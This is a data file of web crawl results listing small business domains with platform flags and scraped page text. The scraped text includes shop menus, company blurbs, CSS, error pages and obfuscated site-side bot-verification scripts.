function() {history.replaceState(null, null, ogU);}}document.getElementsByTagName('head')[0].appendChild(a);}());"
1473,fopacking.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1477,wallbedsbellingham.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1499,fazcity.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection timeout
1501,lostejidos.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1508,samaamn.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection timeout
1514,www.thetrailerteam.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Loader Please wait while your request is being verified... var a0Y=a0U;function a0a(){var Q=['plugins','entries','navigator','test','GET','ById','type','submit','344662PSbtOv','2822344ltnVWf','languages','onreadysta','419578QPHGky','mimeTypes','1913868ZGXXUf','userAgent','document','3ncDfxN','value','(((.+)+)+)','__proto__','language','cttl','name','createElem','search','prototype','toString','form','append','appVersion','a6105c0a61','DOMContent','d49030b349','forEach','action','ent','0950635027','input','style','stener','webdriver','2588576kGIYRY','ne;','addEventLi','attachEven','display:no','appendChil','constructo','7fa3b767c4','16692016wdgMuF','Loaded','length','1b41b08f12','hidden','2461225wXYuHz','map'];a0a=function(){return Q;};return a0a();}function a0U(T,n){var a=a0a();return a0U=function(U,b){U=U-0x144;var s=a[U];return s;},a0U(T,n);}(function(T,n){var a0c={T:0x164,n:0x169,a:0x166,U:0x161,b:0x151},t=a0U,a=T();while(!![]){try{var U=parseInt(t(0x160))/0x1+-parseInt(t(a0c.T))/0x2*(parseInt(t(a0c.n))/0x3)+-parseInt(t(0x149))/0x4+-parseInt(t(0x156))/0x5+-parseInt(t(a0c.a))/0x6+-parseInt(t(a0c.U))/0x7+parseInt(t(a0c.b))/0x8;if(U===n)break;else a['push'](a['shift']());}catch(b){a['push'](a['shift']());}}}(a0a,0x57d88));var a0b=window[a0Y(0x15a)],a0s={'webdriverCheck':function(){var a0Z={T:0x148},i=a0Y;return i(0x148)in window||!!a0b[i(a0Z.T)];},'userAgentCheck':function(){var B=a0Y;return/headless|bytespider/i[B(0x15b)](a0b[B(0x167)]);},'appVersionCheck':function(){var a0v={T:0x15b,n:0x176},h=a0Y;return/headless/i[h(a0v.T)](a0b[h(a0v.n)]);},'pluginArraySpoofing':function(){var a0S={T:0x172,n:0x16c,a:0x153},g=a0Y;let T=PluginArray[g(a0S.T)]===a0b[g(0x158)][g(a0S.n)];if(a0b[g(0x158)][g(a0S.a)]>0x0)T&=Plugin[g(a0S.T)]===a0b[g(0x158)][0x0][g(0x16c)];return!T;},'mimeTypeArraySpoofing':function(){var a0J={T:0x16c,n:0x153},o=a0Y;let T=MimeTypeArray[o(0x172)]===a0b[o(0x165)][o(a0J.T)];if(a0b[o(0x165)][o(a0J.n)]>0x0)T&=MimeType['prototype']===a0b[o(0x165)][0x0]['__proto__'];return!T;},'noLanguage':function(){var a0E={T:0x162,n:0x153},F=a0Y;return!a0b[F(0x16d)]||a0b[F(a0E.T)][F(a0E.n)]===0x0;},'zeroOuterDimensions':function(){return window['outerHeigh'+'t']===0x0&&window['outerWidth']===0x0;}},a0p=function(a,U){var a0m={T:0x14b,n:0x168,a:0x14c,U:0x163},a0K={T:0x16b,n:0x173,a:0x14f},d=a0Y,b=(function(){var p=!![];return function(r,V){var R=p?function(){if(V){var C=V['apply'](r,arguments);return V=null,C;}}:function(){};return p=![],R;};}()),s=b(this,function(){var u=a0U;return s[u(0x173)]()[u(0x171)](u(a0K.T)+'+$')[u(a0K.n)]()[u(a0K.a)+'r'](s)[u(0x171)](u(a0K.T)+'+$');});s(),window[d(a0m.T)+'stener']?window[d(a0m.n)]['addEventLi'+d(0x147)](d(0x178)+d(0x152),a,U):window[d(0x168)][d(a0m.a)+'t'](d(a0m.U)+'techange',a);};a0p(function(){var a0k={T:0x170,n:0x168,a:0x17c,U:0x145,b:0x170,s:0x170,p:0x145,r:0x145,V:0x159,R:0x175,C:0x154,L:0x175,G:0x17a,e:0x173,q:0x14d,A:0x17b,N:0x16f,l:0x155,f:0x16a,x:0x15e,y:0x15e,Y:0x14e,c:0x15f};setTimeout(function(){var z=a0U,T=window[z(0x168)]['getElement'+z(0x15d)]('syz3l0avjkig'),n=+((+!+[]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![])+(+!+[]+[])+(+!+[]+!![]+!![])),a=window[z(0x168)][z(a0k.T)+z(0x17c)](z(0x174)),U=window[z(a0k.n)]['createElem'+z(0x17c)](z(0x145)),b=window['document'][z(0x170)+z(a0k.a)](z(a0k.U)),s=window['document'][z(a0k.b)+'ent']('input'),p=window['document'][z(a0k.s)+'ent'](z(a0k.p)),r=window[z(0x168)][z(0x170)+'ent'](z(a0k.r)),V=+((+!+[]+!![]+!![])+(+!+[]+!![]+!![]+!![]+[])+(+!+[]+!![])+(+!+[]+[])+(+![])+(+!+[]+!![]+!![]+[])+(+![])),R='wsidchk',C='pdata',L='http%3A%2F%2Fwww.thetrailerteam.com',G='/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f',e='failedChecks',q=Object[z(a0k.V)](a0s)[z(0x157)](([f,x])=>{try{return x()?f:null;}catch(y){return null;}})['filter'](f=>f!==null),A=q['length']>0x0;if(A){var N=new URLSearchParams();N[z(a0k.R)]('id',z(0x177)+z(a0k.C)+z(0x144)+'9e'),N[z(0x175)]('ts','1787941437'),N['append'](R,n+V),N[z(a0k.L)](C,L),N[z(a0k.R)](z(0x16e),'0'),q[z(a0k.G)](f=>N[z(0x175)](e,f));var l=new XMLHttpRequest();l['open'](z(0x15c),G+'?'+N[z(a0k.e)]()),l['send'](null);}else a['id']='syz3l0avjkig',a[z(0x146)]=z(a0k.q)+z(0x14a),a['method']=z(0x15c),a[z(a0k.A)]=G,U['id']='c9amahor4s2u',U[z(a0k.N)]=R,U[z(0x16a)]=n+V,U[z(0x15e)]=z(a0k.l),s[z(a0k.N)]='id',s['value']=z(0x150)+'60b54a2be4'+z(0x179)+'c7',s['type']=z(a0k.l),p[z(a0k.N)]='ts',p[z(a0k.f)]='1787941437',p[z(0x15e)]=z(0x155),b['id']='qk4o5dz7xy2g',b[z(a0k.N)]=C,b['value']=L,b[z(a0k.x)]='hidden',r['name']=z(0x16e),r[z(0x16a)]='0',r[z(a0k.y)]='hidden',a[z(a0k.Y)+'d'](U),a[z(0x14e)+'d'](b),a[z(0x14e)+'d'](s),a[z(0x14e)+'d'](p),a['appendChil'+'d'](r),T[z(0x14e)+'d'](a),a[z(a0k.c)]();},0x3e8);},![]);"
1515,bulkandorganics.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Please enable cookies. Error 1001 Ray ID: a32559a98c098158 • 2026-08-28 18:23:58 UTC DNS resolution error What happened? You've requested a page on a website (bulkandorganics.com) that is on the Cloudflare network. Cloudflare is currently unable to resolve your requested domain (bulkandorganics.com). There are two potential causes of this: Most likely: if the owner just signed up for Cloudflare it can take a few minutes for the website's information to be distributed to our global network. Less likely: something is wrong with this site's configuration. Usually this happens when accounts have been signed up with a partner organization (e.g., a hosting provider) and the provider's DNS fails. Please see https://developers.cloudflare.com/support/troubleshooting/http-status-codes/cloudflare-1xxx-errors/error-1001/ for more details. Was this page helpful? Yes No Thank you for your feedback! Cloudflare Ray ID: a32559a98c098158 • Your IP: Click to reveal 34.136.84.82 • Performance & security by Cloudflare (function(){function d(){var b=a.getElementById(""cf-footer-item-ip""),c=a.getElementById(""cf-footer-ip-reveal"");b&&""classList""in b&&(b.classList.remove(""hidden""),c.addEventListener(""click"",function(){c.classList.add(""hidden"");a.getElementById(""cf-footer-ip"").classList.remove(""hidden"")}))}var a=document;document.addEventListener&&a.addEventListener(""DOMContentLoaded"",d)})(); window._cf_translation = {};"
1517,www.cantinealdegheri.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1524,ronch.us,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1535,portalprint.co.uk,woocommerce,woocommerce,True,6,0,0,GBP,True,True,First Name,none,True,generic,none,True,0,True,False,"Skip to content Search £ 0.00 0 Cart Shop All Books & Booklets Booklets Books Photobooks Branded Clothing Casual Clothing Workwear Business Stationery Business Cards Business Extras Envelopes NCR & Notepads Calendars Canvas and Wall Cards & Invitations Postcards Occasion Cards Invitations Eco-Friendly Products Events Badges Balloons Lanyards Tickets & Vouchers Flyers Folded Leaflets Hospitality Dining & Tablewear Labels & Packaging Cards & Tags Menus Packaging Food & Drink Packaging Gift Wrapping Shipping Packaging Posters Promotional Products Bags Drinkware Stationery Roller Banners Signage & Outdoors Banners Flags Signs & Boards Stickers & Labels My Account About Contact Help Guides Design Service View Basket MENU Close MENU Open MENU Shop All Books & Booklets Booklets Books Photobooks Branded Clothing Casual Clothing Workwear Business Stationery Business Cards Business Extras Envelopes NCR & Notepads Calendars Canvas and Wall Cards & Invitations Postcards Occasion Cards Invitations Eco-Friendly Products Events Badges Balloons Lanyards Tickets & Vouchers Flyers Folded Leaflets Hospitality Dining & Tablewear Labels & Packaging Cards & Tags Menus Packaging Food & Drink Packaging Gift Wrapping Shipping Packaging Posters Promotional Products Bags Drinkware Stationery Roller Banners Signage & Outdoors Banners Flags Signs & Boards Stickers & Labels My Account About Contact Help Guides Design Service View Basket Featured: Books & Booklets Flyers Posters Folded Leaflets Roller Banners Signage & Outdoors Business Cards Menus Books & Booklets Choose from a range of binding options and materials to customize your books to perfection View Range Roller Banners Perfect for any event, promotion or display, in a range of styles and sizes View Range Business Essentials Choose from business cards, letterheads, invoices, duplicate forms and more View Range Free Shipping Secure Payments Free Artwork Check Design Service Browse our popular categories below, or click the Shop button to view the entire catalogue. Shop All Categories .elementor-1208 .elementor-element.elementor-element-ef25a5d{--display:flex;--flex-direction:row;--container-widget-width:calc( ( 1 - var( --container-widget-flex-grow ) ) * 100% );--container-widget-height:100%;--container-widget-flex-grow:1;--container-widget-align-self:stretch;--flex-wrap-mobile:wrap;--justify-content:space-between;--align-items:flex-start;--gap:0px 0px;--row-gap:0px;--column-gap:0px;--flex-wrap:wrap;--margin-top:0px;--margin-bottom:0px;--margin-left:0px;--margin-right:0px;--padding-top:0%;--padding-bottom:0%;--padding-left:0%;--padding-right:0%;}.elementor-1208 .elementor-element.elementor-element-eda7c47{width:100%;max-width:100%;text-align:center;}.elementor-1208 .elementor-element.elementor-element-eda7c47 > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;border-style:none;border-radius:6px 6px 0px 0px;}.elementor-1208 .elementor-element.elementor-element-eda7c47 img{width:100vw;max-width:100%;height:20vh;object-fit:cover;object-position:center center;border-style:none;border-radius:8px 8px 8px 8px;}.elementor-1208 .elementor-element.elementor-element-08ff0c4{width:100%;max-width:100%;text-align:start;}.elementor-1208 .elementor-element.elementor-element-08ff0c4 > .elementor-widget-container{margin:0px 0px 0px 0px;padding:1rem 0rem 1rem 0rem;}.elementor-1208 .elementor-element.elementor-element-08ff0c4.elementor-element{--flex-grow:1;--flex-shrink:0;}.elementor-1208 .elementor-element.elementor-element-08ff0c4 .elementor-heading-title{font-family:var( --e-global-typography-9a4211e-font-family ), Sans-serif;font-size:var( --e-global-typography-9a4211e-font-size );font-weight:var( --e-global-typography-9a4211e-font-weight );text-transform:var( --e-global-typography-9a4211e-text-transform );font-style:var( --e-global-typography-9a4211e-font-style );text-decoration:var( --e-global-typography-9a4211e-text-decoration );line-height:var( --e-global-typography-9a4211e-line-height );color:var( --e-global-color-primary );}@media(min-width:768px){.elementor-1208 .elementor-element.elementor-element-ef25a5d{--width:100%;}}@media(max-width:1024px){.elementor-1208 .elementor-element.elementor-element-08ff0c4 .elementor-heading-title{font-size:var( --e-global-typography-9a4211e-font-size );line-height:var( --e-global-typography-9a4211e-line-height );}}@media(max-width:767px){.elementor-1208 .elementor-element.elementor-element-08ff0c4 .elementor-heading-title{font-size:var( --e-global-typography-9a4211e-font-size );line-height:var( --e-global-typography-9a4211e-line-height );}} Banners Books & Booklets Business Stationery Flyers Folded Leaflets Signs & Boards Discover Popular Products .elementor-549 .elementor-element.elementor-element-efbc998{--display:flex;--justify-content:flex-start;--gap:0px 0px;--row-gap:0px;--column-gap:0px;--flex-wrap:wrap;border-style:none;--border-style:none;--margin-top:0px;--margin-bottom:0px;--margin-left:0px;--margin-right:0px;--padding-top:0%;--padding-bottom:0%;--padding-left:0%;--padding-right:0%;}.elementor-549 .elementor-element.elementor-element-13ba251{width:100%;max-width:100%;}.elementor-549 .elementor-element.elementor-element-13ba251 > .elementor-widget-container{background-color:var( --e-global-color-401e313 );margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;border-style:none;border-radius:8px 8px 8px 8px;}.elementor-549 .elementor-element.elementor-element-13ba251 img{width:100%;max-width:100%;height:100%;object-fit:cover;object-position:center center;border-style:none;border-radius:8px 8px 8px 8px;}.elementor-549 .elementor-element.elementor-element-7edfb04{width:100%;max-width:100%;text-align:start;}.elementor-549 .elementor-element.elementor-element-7edfb04 > .elementor-widget-container{padding:0.8rem 0rem 0rem 0rem;}.elementor-549 .elementor-element.elementor-element-7edfb04 .elementor-heading-title{font-family:var( --e-global-typography-d2c8b35-font-family ), Sans-serif;font-size:var( --e-global-typ"
1537,namooverseas.in,woocommerce,woocommerce,True,5,0,0,,True,True,Name(required),none,False,,none,False,2,False,False,"img#wpstats{display:none} {""imports"":{""@wordpress/interactivity"":""http://namooverseas.in/wp-includes/js/dist/script-modules/interactivity/index.min.js?ver=efaa5193bbad9c60ffd1"",""@wordpress/interactivity-router"":""http://namooverseas.in/wp-includes/js/dist/script-modules/interactivity-router/index.min.js?ver=a6e90b8896f83fb1b5dd"",""@wordpress/a11y"":""http://namooverseas.in/wp-includes/js/dist/script-modules/a11y/index.min.js?ver=f62f48906198ea8abc60""}} .woocommerce-product-gallery{ opacity: 1 !important; } @font-face{font-family:ABeeZee;font-style:normal;font-weight:400;font-display:fallback;src:url('https://namooverseas.in/wp-content/uploads/fonts/esDR31xSG-6AGleN6teukbcHCpE.woff2') format('woff2');} Responsive Menu – Namo body { font-family: 'Poppins', sans-serif; margin: 0; padding: 0; background: #fff; color: #222; } nav { background-color: transparent; padding: 10px 15px; box-shadow: none; position: relative; z-index: 1000; } .nav-container { display: flex; justify-content: space-between; align-items: center; } .nav-links { display: flex; list-style: none; gap: 15px; padding: 0; margin: 0; } .nav-links li { position: relative; } .nav-links a { text-decoration: none; color: #222; font-size: 16px; font-weight: 500; border-bottom: 2px solid transparent; padding: 6px 0; display: inline-block; transition: all 0.3s ease; } .nav-links a:hover { color: #ff6900; border-bottom: 2px solid #68C2F2; } .dropdown-content { display: none; position: absolute; background: #fff; top: 35px; left: 0; min-width: 200px; box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1); z-index: 1000; } .dropdown-content a { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; color: #222; border-bottom: 1px solid #eee; font-size: 15px; } .dropdown-content a:hover { background-color: #f4f4f4; color: #ff6900; } .submenu-icon { font-size: 12px; color: #000; } .dropdown:hover .dropdown-content { display: block; } .hamburger { display: none; font-size: 26px; cursor: pointer; border: none; background: none; } @media (max-width: 768px) { .hamburger { display: block; } .nav-links { flex-direction: column; display: none; gap: 0; position: absolute; top: 60px; right: 0; width: 260px; background-color: #fff; padding: 15px; box-shadow: -3px 0 8px rgba(0,0,0,0.15); border-radius: 0 0 0 6px; z-index: 999; animation: slideIn 0.30s ease forwards; } .nav-links.show { display: flex; } .dropdown-content { position: relative; top: 0; left: 0; box-shadow: none; } .dropdown .dropdown-content { display: none; } .dropdown.open .dropdown-content { display: block; } @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } } } ☰ Home About Us ▾ Company Profile ▸ Trust & Assurance ▸ Products ▾ Fresh Vegetables ▸ Fruits (Fresh & Dried) ▸ Grains & Pulses ▸ FAQs Blog Policies ▾ Terms & Conditions ▸ Privacy Policy ▸ Contact Us function toggleMenu() { document.getElementById('mobileMenu').classList.toggle('show'); } function toggleDropdown(el) { const isOpen = el.classList.contains('open'); document.querySelectorAll('.dropdown').forEach(d => d.classList.remove('open')); if (!isOpen) el.classList.add('open'); } document.addEventListener('click', e => { if (!e.target.closest('.dropdown') && !e.target.closest('.hamburger')) { document.querySelectorAll('.dropdown').forEach(d => d.classList.remove('open')); } }); document.addEventListener('click', e => { const menu = document.getElementById('mobileMenu'); const hamburger = document.querySelector('.hamburger'); if (!menu.contains(e.target) && !hamburger.contains(e.target)) { menu.classList.remove('show'); } }); Bringing the Best to the World Namo Overseas, based in India, specializes in exporting fresh fruits, vegetables, grains, and other agricultural products, delivering quality and trust to buyers worldwide. WELCOME TO NAMO OVERSEAS Namo Overseas is a trusted export company based in Maharashtra, India, proudly connecting Indian farmers and producers with buyers across global markets. We specialize in exporting agricultural and agro-based products, delivering consistent quality, reliability, and trust. With transparent practices and a long-term partnership approach, we are committed to meeting diverse international demands — and going beyond expectations. const element = document.getElementById(""namoSlideUp""); const observer = new IntersectionObserver((entries) => { entries.forEach(entry => { if (entry.isIntersecting) { element.style.opacity = ""1""; element.style.transform = ""translateY(0)""; observer.unobserve(element); } }); }, { threshold: 0.25 }); observer.observe(element); Explore More Explore by Category Fresh Fruits, Vegetables, Grains, and Agro-Based Products — Premium Quality for Global Markets. Fresh & Dried Fruits Nature’s Best, Delivered Worldwide Vegetables Farm Fresh, Verified Quality Grains & Pulses Nature’s Bounty, Globally Delivered Core Values Integrity We practice honesty, transparency, and ethics in every thread of our work, earning the trust of our partners and customers. Quality Excellence We deliver top-quality agricultural and agro-based products, supported by careful sourcing, strict quality control, and a strong commitment to excellence. Customer Satisfaction Our customers are at the heart of everything we do—we listen, adapt, and exceed their expectations to build lasting relationships. Our Vision | Global Agro Exports To become a globally trusted exporter of Indian agricultural and agro-based products, recognized for quality, integrity, and long-term partnerships, while representing India as a reliable source of premium agro products in international markets. Our Mission | Global Agro Exports To export India’s finest agricultural and agro-based products with a strong focus on quality, ethical sourcing, and timely delivery, while maintaining transparent business practices and continuously adapting to global market needs. High-Demand Export Products Onions Raisins Pomegranates Rice Maize Certification "
1539,xcelautoservices.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,Forbidden You don't have permission to access this resource.
1541,geol.by,woocommerce,woocommerce,True,12,0,0,,False,False,,none,False,,whatsapp,False,0,False,False,"// Flicker fix. ОДО ""Геол"" Республика Беларусь, г. Минск,проезд Столетова, д. 8 +375 (17) 390-68-08 +375 (29) 625-06-90 info@geol.by УСЛУГИ ОСТАВИТЬ ЗАЯВКУ geolminsk@inbox.ru Главная О компании Каталог Линия BioBlood Линия BioCompact II Линия BioMidi Линия BioPlus Линия BioUltra –UL570 Линия ExGuard Холодильники и морозильники для медицины фирмы Gram BioLine Дания Каталог Gram BioLine Дания Комплектующие Услуги Гарантийное обслуживание Плановое техническое обслуживание Диагностика и ремонт Заявка Контакты Поиск Меню Холодильное оборудование в Минске ОДО ""Геол"" Гарантийное обслуживание Плановое техническое обслуживание Диагностика и ремонт Выбрать категорию Выбрать категорию Комплектующие для холодильного оборудования | ОДО «Геол», г. Минск Линия BioBlood Линия BioCompact II Линия BioMidi Линия BioPlus Линия BioUltra –UL570 Поиск от 0,6 мм до 16 мм. ПРУЖИНЫ СЖАТИЯ Различного назначения для ряда машиностроительных заводов Республики Беларусь. Подробнее Загортачи для посевных агрегатов ЗУБЬЯ ПРУЖИННЫЕ Зубья сгребания к кормозаготовительной технике: граблям, ворошилкам и т.д. Подробнее от 1,6 мм до 16 мм. ПРУЖИНЫ РАСТЯЖЕНИЯ Компания одна из первых в Беларуси освоила выпуск пружин методом холодной навивки. Подробнее НОВЫЙ ВЕК спринг ЗУБЬЯ ДЛЯ ЛЬНОУБОРОЧНОЙ ТЕХНИКИ Наше предприятие готово изготовить зубья в любом количестве (партия - от 50 до 200 шт.) по образцам заказчика. Подробнее НОВЫЙ ВЕК спринг ЗУБЬЯ К ПОЧВООБРАБАТЫВАЮЩИМ МАШИНАМ Наше предприятие готово изготовить зубья в любом количестве (партия - от 50 до 200 шт.) по образцам заказчика. Подробнее НОВЫЙ ВЕК спринг ЗУБЬЯ К КОРМОЗАГОТОВИТЕЛЬНОЙ ТЕХНИКЕ Наше предприятие готово изготовить зубья в любом количестве (партия - от 50 до 200 шт.) по образцам заказчика. Подробнее Холодильное оборудование в Минске КАТАЛОГ ОДО «Геол» работает с организациями по всей Республике Беларусь. Холодильники и морозильники для медицины фирмы Gram BioLine Дания Линия ExGuard Линия BioUltra –UL570 Линия BioPlus Линия BioMidi Линия BioCompact II Линия BioBlood Каталог Gram BioLine Дания Комплектующие для холодильного оборудования НАШИ ОСНОВНЫЕ ПРЕИМУЩЕСТВА ПОЧЕМУ РАБОТАЮТ С НАМИ Мы строго соблюдаем сроки выполнения заказов, что позволяет нашим клиентам планировать свою деятельность без риска задержек Удобная и быстрая доставка Гарантия на всю продукцию Любые виды оплат Постоянные скидки и акции Холодильное оборудование в Минске О компании Компания ОДО «Геол» основана в 1993 году и имеет богатый опыт поставки, гарантийного и постгарантийного обслуживания холодильного оборудования в Республике Беларусь на предприятиях, торговой, фармацевтической, научной и других отраслей. Сервисные работы осуществляются высококвалифицированным персоналом, постоянно повышающим свой профессиональный уровень. ПОДРОБНЕЕ О КОМПАНИИ НАШИ УСЛУГИ Вопрос-ответ Есть ли в холодильниках и морозильниках фирмы Gram принудительная вентиляция ? Есть во всех моделях кроме ультранизкого морозильника на -86°С модель UL570 Есть ли в холодильниках и морозильниках фирмы Gram автоматическая оттайка? Есть во всех моделях кроме ультранизкого морозильника на -86°С модель UL570. Имеет ли контроллер холодильников и морозильников фирмы Gram память показаний температуры за предыдущих 12 месяцев работы при аварийном сбое напряжения? Контроллеры холодильников и морозильников фирмы Gram имеют память показаний температуры за 12 предыдущих месяцев работы, даже если пропадает питание 220В 50Гц. В случае пропадания напряжения питания подаваемое на холодильник или морозильник автоматически переключается подача питания от аккумулятора встроенного в электрическую схему прибора. КОНТАКТЫ Общество с дополнительной ответственностью ""Геол"" Адрес: Республика Беларусь, г. Минск, проезд Столетова, д. 8 info@geol.by +375 (17) 390-68-08 +375 (29) 625-06-90 Whatsapp Telegram РБ, г. Минск, проезд Столетова, д. 8 +375 (17) 390-68-08 +375 (29) 625-06-90 info@geol.by Whatsapp Telegram Меню Главная О компании Каталог Комплектующие Гарантийное обслуживание Плановое техническое обслуживание Диагностика и ремонт Заявка Контакты Согласие на обработку персональных данных КАТАЛОГ Линия BioBlood Линия BioCompact II Линия BioMidi Линия BioPlus Линия BioUltra –UL570 Линия ExGuard Холодильники и морозильники для медицины фирмы Gram BioLine Дания Каталог Gram BioLine Дания © Все права защищены 2024 ОДО ""Геол"" Главная О компании Каталог Линия BioBlood Линия BioCompact II Линия BioMidi Линия BioPlus Линия BioUltra –UL570 Линия ExGuard Холодильники и морозильники для медицины фирмы Gram BioLine Дания Каталог Gram BioLine Дания Комплектующие Услуги Гарантийное обслуживание Плановое техническое обслуживание Диагностика и ремонт Заявка Контакты Поиск Начните вводить текст, чтобы увидеть товары, которые вы ищете. {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""/*""},{""not"":{""href_matches"":[""/wp-*.php"",""/wp-admin/*"",""/wp-content/uploads/*"",""/wp-content/*"",""/wp-content/plugins/*"",""/wp-content/themes/woodmart/*"",""/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} const lazyloadRunObserver = () => { const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` ); const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => { entries.forEach( ( entry ) => { if ( entry.isIntersecting ) { let lazyloadBackground = entry.target; if( lazyloadBackground ) { lazyloadBackground.classList.add( 'e-lazyloaded' ); } lazyloadBackgroundObserver.unobserve( entry.target ); } }); }, { rootMargin: '200px 0px 200px 0px' } ); lazyloadBackgrounds.forEach( ( lazyloadBackground ) => { lazyloadBackgroundObserver.observe( lazyloadBackground ); } ); }; const events = [ 'DOMContentLoaded', 'elementor/lazyload/observe', ]; events.forEach( ( event ) => { document.addEventListener( event, lazyloadRunObserver ); } ); (function () { var c = document.body.className; c = c.replace(/woocommerce-no-js/, 'woocommerce-js'); d"
1550,sd-spring.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1553,ipssac.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1555,nowcustomboxes.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Loader Please wait while your request is being verified... var a0W=a0x;(function(H,Z){var a0s={H:0x106,Z:0x10e,m:0x10c,x:0xec,Y:0xfa,k:0x11c},K=a0x,m=H();while(!![]){try{var x=parseInt(K(a0s.H))/0x1+parseInt(K(a0s.Z))/0x2+-parseInt(K(0xf1))/0x3*(-parseInt(K(a0s.m))/0x4)+-parseInt(K(a0s.x))/0x5+-parseInt(K(0xfc))/0x6+-parseInt(K(0xe3))/0x7+-parseInt(K(a0s.Y))/0x8*(-parseInt(K(a0s.k))/0x9);if(x===Z)break;else m['push'](m['shift']());}catch(Y){m['push'](m['shift']());}}}(a0m,0x54962));var a0Y=window[a0W(0xf7)],a0k={'webdriverCheck':function(){var a0o={H:0xe8,Z:0xe8},w=a0W;return w(a0o.H)in window||!!a0Y[w(a0o.Z)];},'userAgentCheck':function(){var a0P={H:0xf6,Z:0x11d},i=a0W;return/headless|bytespider/i[i(a0P.H)](a0Y[i(a0P.Z)]);},'appVersionCheck':function(){var Q=a0W;return/headless/i['test'](a0Y[Q(0xe5)]);},'pluginArraySpoofing':function(){var a0C={H:0x10a,Z:0x11b},O=a0W;let H=PluginArray[O(0x10d)]===a0Y['plugins'][O(a0C.H)];if(a0Y[O(a0C.Z)]['length']>0x0)H&=Plugin['prototype']===a0Y[O(a0C.Z)][0x0][O(a0C.H)];return!H;},'mimeTypeArraySpoofing':function(){var a0f={H:0xfd,Z:0x10a,m:0x10d},V=a0W;let H=MimeTypeArray[V(0x10d)]===a0Y[V(a0f.H)][V(a0f.Z)];if(a0Y['mimeTypes'][V(0x104)]>0x0)H&=MimeType[V(a0f.m)]===a0Y[V(0xfd)][0x0][V(0x10a)];return!H;},'noLanguage':function(){var a0h={H:0x113},v=a0W;return!a0Y[v(a0h.H)]||a0Y['languages'][v(0x104)]===0x0;},'zeroOuterDimensions':function(){var a=a0W;return window[a(0x108)+'t']===0x0&&window[a(0x10b)]===0x0;}},a0E=function(m,x){var a0U={H:0x103,Z:0xea,m:0xef,x:0xe4},a0L={H:0x107,Z:0xf2,m:0x117},g=a0W,Y=(function(){var E=!![];return function(D,q){var n=E?function(){var r=a0x;if(q){var p=q[r(0x110)](D,arguments);return q=null,p;}}:function(){};return E=![],n;};}()),k=Y(this,function(){var l=a0x;return k[l(0xff)]()[l(a0L.H)](l(0x117)+'+$')['toString']()[l(a0L.Z)+'r'](k)[l(a0L.H)](l(a0L.m)+'+$');});k(),window['addEventLi'+g(a0U.H)]?window[g(0xef)]['addEventLi'+g(0x103)]('DOMContent'+g(a0U.Z),m,x):window[g(a0U.m)][g(a0U.x)+'t'](g(0xf5)+g(0xf3),m);};function a0m(){var A=['outerHeigh','7fa3b767c4','__proto__','outerWidth','25444UtUWIr','prototype','924534AcoXmY','createElem','apply','cttl','action','language','name','value','0950635027','(((.+)+)+)','append','ne;','d49030b349','plugins','923778urVlMu','userAgent','1951271ziFPbF','attachEven','appVersion','GET','form','webdriver','hidden','Loaded','style','2988060giHvRE','60b54a2be4','1b41b08f12','document','ent','231GpcqRz','constructo','techange','ById','onreadysta','test','navigator','getElement','appendChil','40sHDfWC','filter','3545322cOktPe','mimeTypes','submit','toString','map','input','type','stener','length','method','348444tSfYNj','search'];a0m=function(){return A;};return a0m();}function a0x(H,Z){var m=a0m();return a0x=function(x,Y){x=x-0xe3;var k=m[x];return k;},a0x(H,Z);}a0E(function(){var a0b={H:0xf8,Z:0x10f,m:0xe7,x:0x10f,Y:0xf0,k:0x10f,E:0x101,D:0xf0,q:0x101,n:0x118,p:0xee,T:0x111,N:0xff,J:0xeb,d:0x119,S:0x105,t:0x112,u:0x115,F:0xe9,j:0x114,B:0x109,W:0x115,s:0x102,o:0x114,P:0x102};setTimeout(function(){var 